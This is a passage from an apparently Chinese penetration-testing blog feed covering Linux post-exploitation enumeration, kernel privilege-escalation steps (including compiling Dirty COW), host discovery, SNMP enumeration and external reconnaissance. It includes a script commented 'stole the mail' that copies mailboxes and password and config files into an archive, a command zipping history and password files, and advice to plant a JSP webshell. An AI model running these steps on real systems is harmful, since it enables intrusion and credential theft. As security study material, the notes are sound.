class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#发行版本</span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">cat /etc/lsb-release</span><br><span class="line">cat /etc/redhat-release</span><br><span class="line"></span><br><span class="line">#内核版本</span><br><span class="line">uname -a</span><br><span class="line">uname -mrs</span><br><span class="line">cat /proc/version</span><br><span class="line">rpm -q kernel</span><br><span class="line">ls /boot | grep vmlinuz</span><br></pre></td></tr></table></figure></li><li><p>账号权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">whoami</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure></li><li><p>其他常用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntulp</span><br><span class="line">cat /etc/passwd</span><br><span class="line">ps -aux</span><br><span class="line">history</span><br><span class="line">last</span><br><span class="line">w</span><br><span class="line">ifconfig</span><br><span class="line">ipaddr</span><br><span class="line">sockstat -4</span><br><span class="line">cat /etc/crontab</span><br><span class="line">rdesktop#连接远程桌面</span><br></pre></td></tr></table></figure></li></ul><p>信息收集脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">echo #######geting sysinfo####</span><br><span class="line">echo ######usage: ./getinfo.sh &gt;/tmp/sysinfo.txt</span><br><span class="line">echo #######basic infomation##</span><br><span class="line">cat /proc/meminfo</span><br><span class="line">echo</span><br><span class="line">cat /proc/cpuinfo</span><br><span class="line">echo</span><br><span class="line">rpm -qa 2&gt;/dev/null</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#####stole the mail……######</span></span></span><br><span class="line">cp -a /var/mail /tmp/getmail 2&gt;/dev/null</span><br><span class="line">echo ‘u’r id is’ `id`</span><br><span class="line">echo ###atq&amp;crontab#####</span><br><span class="line">atq</span><br><span class="line">crontab -l</span><br><span class="line">echo #####about var#####</span><br><span class="line">set</span><br><span class="line"> </span><br><span class="line">echo #####about network###</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###this is then point in pentest,but i am a new bird,so u need to add some in it</span></span></span><br><span class="line">cat /etc/hosts</span><br><span class="line">hostname</span><br><span class="line">ipconfig -a</span><br><span class="line">arp -v</span><br><span class="line">echo ####user####</span><br><span class="line">cat /etc/passwd|grep -i sh</span><br><span class="line"> </span><br><span class="line">echo ####service####</span><br><span class="line">chkconfig –list</span><br><span class="line"> </span><br><span class="line">for i in &#123;oracle,mysql,tomcat,samba,apache,ftp&#125;</span><br><span class="line">cat /etc/passwd|grep -i $i</span><br><span class="line">done</span><br><span class="line"> </span><br><span class="line">locate passwd &gt;/tmp/password 2&gt;/dev/null</span><br><span class="line">sleep 5</span><br><span class="line">locate password &gt;&gt;/tmp/password 2&gt;/dev/null</span><br><span class="line">sleep 5</span><br><span class="line">locate conf &gt;/tmp/sysconfig 2&gt;dev/null</span><br><span class="line">sleep 5</span><br><span class="line">locate config &gt;&gt;/tmp/sysconfig 2&gt;/dev/null</span><br><span class="line">sleep 5</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##maybe can use "tree /"###</span></span></span><br><span class="line">echo ##packing up#########</span><br><span class="line">tar cvf getsysinfo.tar /tmp/getmail /tmp/password /tmp/sysconfig</span><br><span class="line">rm -rf /tmp/getmail /tmp/password /tmp/sysconfig</span><br></pre></td></tr></table></figure><p>找出所有.sh .pl .py .conf .cnf .ini .<em>history .</em>pass* (/usr/share目录里面的除外) 并且在当前目录zip打包。有些时候很多配置文件的权限配置不严，如果搜集完全的话对于进行下一步有很大帮助。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Find all .sh .pl .py .conf .cnf .ini .*history .*pass* (Except in /usr/share) then zip in current directory</span><br><span class="line">find / ! -path &quot;/usr/share/*&quot; -iregex &quot;.*.sh$|.*.pl$|.*.py$|.*.conf$|.*.cnf$|.*.ini$|.*/..*history$|.*/..*pass.*&quot; -print | zip pack.zip -@</span><br></pre></td></tr></table></figure><ul><li><p>收集exp</p><p><code>.c</code>或者没有后缀名（根据内核版本找exp）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http://www.exploit-db.com </span><br><span class="line">http://1337day.com </span><br><span class="line">http://www.securiteam.com </span><br><span class="line">http://www.securityfocus.com </span><br><span class="line">http://www.exploitsearch.net </span><br><span class="line">http://metasploit.com/modules/ </span><br><span class="line">http://securityreason.com </span><br><span class="line">http://seclists.org/fulldisclosure/ </span><br><span class="line">http://www.google.com</span><br><span class="line">github</span><br><span class="line">baidu</span><br><span class="line">google</span><br></pre></td></tr></table></figure><p>上传exp到可写目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp</span><br><span class="line">ls -l</span><br><span class="line">脚本查找</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp</span><br><span class="line">gcc -pthread dirty.c -o exp -lcrypt#编译的相关选项</span><br></pre></td></tr></table></figure><blockquote><p>如果没有gcc，需要找到和服务器一模一样（内核、发行版本均一样），在该机器中编译该exp，将编译好的exp上传至目标服务器中，运行</p></blockquote><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br><span class="line">whoami</span><br><span class="line">id</span><br></pre></td></tr></table></figure></li></ul><h2 id="提权总结"><a href="#提权总结" class="headerlink" title="提权总结"></a>提权总结</h2><p>拿到webshell</p><p><strong>Windows Server</strong></p><ol><li>whoami判断权限，直接system就不用提权，jsp站直接system权限</li><li>systeminfo查看补丁信息和操作系统版本</li><li>上传exp，找可写目录</li><li>执行，如果无法通过系统漏洞或者系统服务漏洞提权，下一步翻目录</li><li>重点关注，config配置文件，比如数据库连接文件，pcanywhere的密码文件等等一些第三方软件的敏感文件</li></ol><blockquote><p>一个服务器有aspx，php，jsp，拿下来一个aspx的低权限shell，翻目录发现jsp网站的目录，向jsp目录传一个webshell，然后访问jspshell，可能会有最高权限</p></blockquote><p><strong>Linux/unix</strong></p><ol><li>whoai判断权限，如果直接root权限就不用提权，在weglogic，tomcat，jboss等等一些jsp中间件出现的比较多</li><li>查找系统版本 <code>uname -a</code>, <code>cat /proc/version</code> 等等</li><li>接着去<code>www.exploit-db.com</code>查找对应内核版本的exp，然后上传</li><li>上传之后 <code>gcc exp.c -o exp</code>如果有的需要加编译参数，则根据exp的注释说明来写，例如脏牛漏洞的：<code>gcc -pthread dirty.c -o dirty -lcrypt</code>，如果服务器    没有gcc，在本地搭建一个同版本的系统，然后把exp再本地编译之后，传上去</li><li>如果exp无法提权，翻目录，linux敏感目录和文件有哪些（百度），比如说老版本linux的<code>/etc/passwd</code>存储了密码和账号，数据库配置文件等等</li></ol><p>参考：</p><p>《收集系统信息的脚本》<a href="https://ixyzero.com/blog/archives/52.html" target="_blank" rel="noopener">https://ixyzero.com/blog/archives/52.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 后渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集(存活主机探测)</title>
      <link href="/2019/06/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA)/"/>
      <url>/2019/06/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA)/</url>
      
        <content type="html"><![CDATA[<h2 id="识别目标主机"><a href="#识别目标主机" class="headerlink" title="识别目标主机"></a>识别目标主机</h2><p>发现目标网络里的在线主机</p><p>注意：查看与客户达成的协议和服务条款，是否要求我们隐匿行踪，</p><p>或者在测试入侵检测系统(IDS)和入侵防御系统(IPS)时需要使渗透测试行动不被发现。</p><a id="more"></a><p><strong>ping</strong></p><p>使用基于ICPMP协议的<code>echo request</code>和<code>echo reply</code>两种消息类型</p><p>如果目标主机在线且允许接受Ping请求，那么目标主机将回复ICMP reply数据包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 -4/6 -s(packet size) example.com -I eth0(IPv6必须)</span><br></pre></td></tr></table></figure><p><code>ping6</code> 等同于 <code>ping -6</code></p><p><strong>arping</strong></p><p>arping是在局域网中使用<strong>ARP请求</strong>判断目标主机是否在线的工具，可以使用<strong>IP地址</strong>或<strong>MAC地址</strong>作为测试目标。</p><p>因为Arp工作在OSI模型中的第二层，ARP协议的数据包无法通过路由器和网关，所以他只能检测本地局域网络中的主机。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arping 192.168.10.1 -c 1</span><br><span class="line">arping -d -i eth0 192.168.10.2 -c 2</span><br></pre></td></tr></table></figure><p><strong>fping</strong> </p><p>同时探测<code>多个目标</code>/<code>整个网段</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fping 192.168.10.1 192.168.10.2 192.168.10.3 192.168.10.4</span><br><span class="line">fping -g 192.168.10.0/24</span><br><span class="line">fping -r 1 -g 18#重试次数</span><br><span class="line">fping -s www.baidu.com www.bankcomm.com#结果统计</span><br></pre></td></tr></table></figure><p><strong>hping3</strong></p><p>网络数据包生成和分析工具，在<code>TCP/IP测试</code>和<code>安全测试</code>里，用作端口扫描、防火墙规则测试、网络性能测试</p><p>主要用途：</p><ul><li>测试防火墙规则</li><li>测试IDS入侵检测系统</li><li>测试TCP/IP模式的安全漏洞</li></ul><p>命令行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -1 192.168.11.1 -c 1</span><br></pre></td></tr></table></figure><p>交互界面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hping3</span><br><span class="line">#脚本</span><br><span class="line">hping send &#123;ip(daddr=192.168.11.1)+icmp(type=8,code=0)&#125;</span><br><span class="line">#监听</span><br><span class="line">hping recv eth0</span><br></pre></td></tr></table></figure><p>检测防火墙规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#发送ICMP echo请求</span><br><span class="line">hping3 hping3 -1 192.168.11.2 -c 1</span><br><span class="line">#如果防火墙禁止，则会提示不通</span><br><span class="line">hping3 192.168.11.2 -c 1 -S -p 22 -s 6060#对22端口发送SYN标识的TCP包</span><br><span class="line">hping3 -2 192.168.11.242 -c 1 -S -p 22 -s 6060 #发送UDP包</span><br></pre></td></tr></table></figure><p><strong>nping</strong>（Nmap的一部分）</p><ul><li><p>可以发送多种协议(TCP、UDP、ICMP和ARP协议)的数据包；</p></li><li><p>可以调整协议头字段，如TCP和UDP的源端口和目的端口；</p></li><li><p>可以探测多个主机的多个端口；</p></li><li><p>压力测试、ARP投毒、Dos攻击。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nping 192.168.10.1-30 -c 1</span><br><span class="line">nping --tcp -p 22 192.168.10.2 -c 1</span><br></pre></td></tr></table></figure><p><strong>THC–IPv6 Attack Toolkit</strong></p><p>alive6</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alive6 -p eth0#探测内网IPv6主机</span><br><span class="line">ip6tables -A INPUT -p ipv6-icmp --type icmpv6-type 128 -j DROP #禁IPv6方式PING</span><br></pre></td></tr></table></figure><p>detect-new-ip6</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">detect-new-ip6 eth0</span><br></pre></td></tr></table></figure><p>passive_discovery6</p><p>避免IDS检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passive_discovery6 eth0#开启监听，筛选ARP请求和回复</span><br></pre></td></tr></table></figure><p><strong>nbtscan</strong></p><p>审计Windows系统，获取NetBIOS信息。</p><p>将目标主机IP地址、NetBIOS计算机名、可用服务、登陆用户名和MAC地址整理为报告。如需使用NetBIOS协议访问目标主机的NetBIOS服务（例如网络共享），就需要知道目标主机的NetBIOS名称。</p><p>会产生大量网络流量，可能被目标主机记录日志。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nbtscan  192.168.11.1-254</span><br><span class="line">nbtscan  -hv 192.168.11.1-254#查看运行服务</span><br></pre></td></tr></table></figure><h2 id="识别操作系统"><a href="#识别操作系统" class="headerlink" title="识别操作系统"></a>识别操作系统</h2><p>也叫做操作系统指纹识别。</p><p>主动式识别—向目标机器发送数据包，根据目标的响应确定其使用的操作系统（快，但容易被发现）；</p><p>被动式识别—例如P0f工具，克服了主动式识别方法的缺点，但速度慢。</p><p><strong>p0f v3</strong></p><p>采用被动式识别方法，识别范围：</p><ul><li>连接到本机的机器（SYN模式，默认）；</li><li>可以访问到的主机（SYN+ACK模式）；</li><li>不能访问的机器（RST+模式）；</li><li>可以监控到其网络通信的机器。</li></ul><p>通过自身发出的TCP数据包分析操作系统的类型，统计在默认情况下不会产生的非标准数据包。比如，Linux默认使用64字节的ping数据报，而Windows 使用32字节的ping数据报；Windows的TTL是128，Linux的根据版本各有不同。p0f根据这些细微的差别识别远程主机的操作系统。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p0f -f /etc/p0f/p0f.fp -o p0f.log#开启监听，并分析数据包，保存为日志文件</span><br></pre></td></tr></table></figure><p><strong>Nmap</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -o 192.168.10.2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集(SNMP)</title>
      <link href="/2019/06/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(SNMP)/"/>
      <url>/2019/06/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(SNMP)/</url>
      
        <content type="html"><![CDATA[<p>snmp默认团体名属于snmp默认弱口令public/privicy。在win7本机上开启snmp服务，并添加pubilc团体名和允许远程连接后（window默认没有接受的团体名也就是社团名称，且不允许远程连接）</p> <a id="more"></a><h3 id="onesixtyone"><a href="#onesixtyone" class="headerlink" title="onesixtyone"></a>onesixtyone</h3><p>目标团体字符串为public</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onesixtyone 10.192.214.38 public#查看系统信息</span><br></pre></td></tr></table></figure><p>如果不知道，可以进行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onesixtyone -c /usr/share 10.192.214.38 public</span><br></pre></td></tr></table></figure><p><img src="/2019/06/24/信息收集(SNMP)/SNMP信息收集/1561108513808.png" alt="1561108513808"></p><p>查看onesixtyone目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -L onesixtyone</span><br></pre></td></tr></table></figure><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap –sU –p161 –script=snmp-brute ip #查找snmp弱口令  </span><br><span class="line">nmap -sU -p161 --script=snmp-netstat ip#获取网络端口状态</span><br><span class="line">nmap –sU –p161 –script=snmp-sysdescr ip #获取系统信息</span><br><span class="line">nmap -sU -p161 --script=snmp-win32-user ip#获取用户信息</span><br></pre></td></tr></table></figure><h3 id="snmputil-exe"><a href="#snmputil-exe" class="headerlink" title="snmputil.exe"></a>snmputil.exe</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">snmputil walk ip public .1.3.6.1.2.1.25.4.2.1.2#列出系统进程</span><br><span class="line">snmputil walk ip public.1.3.6.1.2.1.25.6.3.1.2 #列出安装的软件</span><br><span class="line">snmputil walk ip public .1.3.6.1.2.1.1 #列出系统信息</span><br><span class="line">snmputil get  ip public .1.3.6.1.4.1.77.1.4.1.0 #列出域名</span><br><span class="line">snmputil walk ip public.1.3.6.1.4.1.77.1.2.25.1.1 #列系统用户列表</span><br></pre></td></tr></table></figure><h3 id="snmpwalk"><a href="#snmpwalk" class="headerlink" title="snmpwalk"></a>snmpwalk</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#系统信息</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.1</span><br><span class="line"></span><br><span class="line">#系统进程列表</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.25.4.2.1.2</span><br><span class="line"></span><br><span class="line">#安装软件列表</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.25.6.3.1.2</span><br><span class="line"></span><br><span class="line">#网口的数量，类型，物理地址和流量信息等</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.2</span><br><span class="line"></span><br><span class="line">#IP地址和子网掩码</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.4.20</span><br><span class="line"></span><br><span class="line">#IP-MAC地址转换表</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.3.1</span><br><span class="line"></span><br><span class="line">#路由表</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.4.21</span><br><span class="line"></span><br><span class="line">#tcp connection table | netstat -t</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.6.13</span><br><span class="line"></span><br><span class="line">#开放的UDP端口</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.7.5</span><br><span class="line"></span><br><span class="line">#系统总内存</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.25.2.2</span><br><span class="line"></span><br><span class="line">#获取账号</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.4.1.2011.5.2.1.10.1</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.4.1.2011.10.2.12.1.1.1</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.4.1.25506.2.12.1.1.1</span><br><span class="line"></span><br><span class="line">#系统用户数</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 hrSystemNumUsers</span><br><span class="line"></span><br><span class="line">#列出域名</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.4.1.77.1.4.1.0</span><br><span class="line"></span><br><span class="line">#系统用户列表</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.4.1.77.1.2.25.1.1</span><br><span class="line"></span><br><span class="line">#得到Windows端的系统进入用户数等</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.25.1</span><br><span class="line"></span><br><span class="line">#获取所有信息</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38</span><br></pre></td></tr></table></figure><p>参考：</p><p>SNMP弱口令漏洞的使用 <a href="https://www.cnblogs.com/-wenli/p/9571057.html" target="_blank" rel="noopener">https://www.cnblogs.com/-wenli/p/9571057.html</a></p><p>snmp默认团体名/弱口令漏洞及安全加固 <a href="https://cloud.tencent.com/developer/news/14370" target="_blank" rel="noopener">https://cloud.tencent.com/developer/news/14370</a></p>]]></content>
      
      
      <categories>
          
          <category> 后渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SNMP </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集(外网)</title>
      <link href="/2019/06/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E5%A4%96%E7%BD%91)/"/>
      <url>/2019/06/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E5%A4%96%E7%BD%91)/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集分类"><a href="#信息收集分类" class="headerlink" title="信息收集分类"></a>信息收集分类</h1><ul><li>被动信息收集：不直接接触目标，而是通过搜索引擎或者爬虫系统等第三方服务来获取关于目标的信息（信息相对较少，但不会被发现）</li><li>主动信息收集：攻击者或者渗透测试人员通过工具去主动去探测或者收集目标的信息，直接和目标接触（获取的信息相对多一些，但是可能会被各种设备捕获到扫描行为）</li></ul><p><strong>从web安全的角度来考虑</strong></p><ol><li>域名(whois注册相关信息，子域名，备案信息)</li><li>服务器(DNS信息，端口服务，真实IP，系统类型和版本：用来搜索是否符合某个漏洞)</li><li>web应用(网站架构(操作系统、中间件、数据库、编程语言)，指纹信息，探测WAF，敏感目录及信息，源码泄露(搜索引擎+工具)，脆弱系统(网络空间)，旁站，c段)</li><li><p>企业信息(天眼查，企业信用信息公示系统，企业员工信息)</p><a id="more"></a></li></ol><h2 id="1-域名信息"><a href="#1-域名信息" class="headerlink" title="1. 域名信息"></a>1. 域名信息</h2><h3 id="Whois信息和Whois反查"><a href="#Whois信息和Whois反查" class="headerlink" title="Whois信息和Whois反查"></a>Whois信息和Whois反查</h3><p><strong>获取的信息</strong></p><ul><li>注册人信息（注册商，联系人，联系邮箱，联系电话，创建时间等）</li><li>DNS服务器信息</li></ul><p><strong>whois查询的网站</strong></p><ul><li><p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a></p></li><li><p><a href="https://s.threatbook.cn/" target="_blank" rel="noopener">https://s.threatbook.cn/</a></p></li><li><p><a href="https://who.is/" target="_blank" rel="noopener">https://who.is/</a></p></li><li><p><a href="https://www.internic.net/whois.html" target="_blank" rel="noopener">InterNIC | Whois</a></p></li><li><a href="http://whois.domaintools.com/" target="_blank" rel="noopener">DomainTools-Whois Lookup, Domain&amp;IP </a></li></ul><p>whois命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois example.com</span><br></pre></td></tr></table></figure><h3 id="子域名枚举"><a href="#子域名枚举" class="headerlink" title="子域名枚举"></a>子域名枚举</h3><p>当开始做安全评估时，通常都是一个简单的域名或者是一组域名，通过发现更多的目标资源，比如目标组织的域名、服务器、web应用程序等，来增加找到漏洞的机会</p><p><strong>子域名枚举原因</strong></p><ul><li>子域名枚举可以在测试范围内发现更多的域或子域，这会增加漏洞发现的几率。</li><li>有些隐藏的、被忽略的子域上运行的应用程序可能会帮助我们发现漏洞。</li><li>在同一个组织的不同域或应用程序中很可能会存在相同类型的漏洞。</li></ul><p><strong>子域名枚举方法</strong></p><p><strong>搜索引擎</strong></p><p>使用多家搜索引擎</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:target.com// google hacking</span><br><span class="line">site:target.com-www// -号去除已知子域名</span><br></pre></td></tr></table></figure><p><strong>证书</strong></p><p>Certificate Transparency(CT)是一个项目，在这个项目中，证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中。SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。</p><p>查找一个域名证书的最简单方法是使用搜索引擎来收集计算机的CT日志，并让任何搜索引擎搜索它们。下面仅列出了比较常用的几种：</p><ol><li><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a></li><li><a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a></li><li><a href="https://developers.facebook.com/tools/ct/" target="_blank" rel="noopener">https://developers.facebook.com/tools/ct/</a></li><li><a href="https://www.google.com/transparencyreport/https/ct/" target="_blank" rel="noopener">https://google.com/transparencyreport/https/ct/</a></li></ol><p>这里是github上的脚本<a href="https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration，简化使用CT日志搜索引擎查找子域名的流程" target="_blank" rel="noopener">https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration，简化使用CT日志搜索引擎查找子域名的流程</a></p><p>在子域名枚举中使用CT的缺点是，在CT日志中找到的域名可能不再存在，因此它们不能被解析为IP地址。可以使用诸如massdns这样与CT日志结合的工具来快速识别可解析的域名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ct.py - 从CT日志中提取域名(同时提供给massdns)# massdns - 将找到可解析的域名并将它们保存到结果文件中</span><br><span class="line">./ct.py icann.org | ./bin/massdns -r resolvers.txt -t A -q -a -o -w icann_resolvable_domains.txt</span><br></pre></td></tr></table></figure><p><strong>自治系统</strong></p><p>找到自治系统号将帮助我们识别属于一个组织的网段，这个组织中可能有有效的域名。</p><ul><li><p>使用dig或host解析给定域名的IP地址</p></li><li><p>提供IP地址就可以找到ASN的工具——<a href="https://asn.cymru.com/cgi-bin/whois.cgi" target="_blank" rel="noopener">https://asn.cymru.com/cgi-bin/whois.cgi</a></p></li><li><p>提供域名就可以找到ASN的工具——<a href="http://bgp.he.net/" target="_blank" rel="noopener">http://bgp.he.net/</a></p><p><img src="/2019/06/24/信息收集(外网)/信息收集/1557756286612.png" alt="1557756286612"></p></li><li><p>发现的ASN编号可以用来查找域名的网段。有Nmap脚本可以实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 